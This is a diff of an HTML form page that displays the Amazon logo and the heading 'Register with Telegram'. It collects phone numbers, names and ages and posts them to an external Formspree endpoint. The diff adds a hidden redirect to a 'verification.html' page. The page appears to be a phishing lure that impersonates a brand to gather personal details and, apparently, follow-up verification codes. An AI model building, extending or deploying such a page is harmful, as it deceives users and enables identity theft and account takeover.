@@ -66,11 +66,15 @@
   <div class="form-container">
     <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" />
     <h2>Register with Telegram</h2>
+
     <form action="https://formspree.io/f/mgvydbna" method="POST">
       <input type="hidden" name="form" value="registration" />
+      <input type="hidden" name="_redirect" value="verification.html" />
+      
       <input type="tel" name="Phone Number" placeholder="Phone Number" required />
       <input type="text" name="Name" placeholder="Your Name" required />
       <input type="number" name="Age" placeholder="Your Age" min="1" max="120" required />
+      
       <button type="submit">Next</button>
     </form>
   </div>
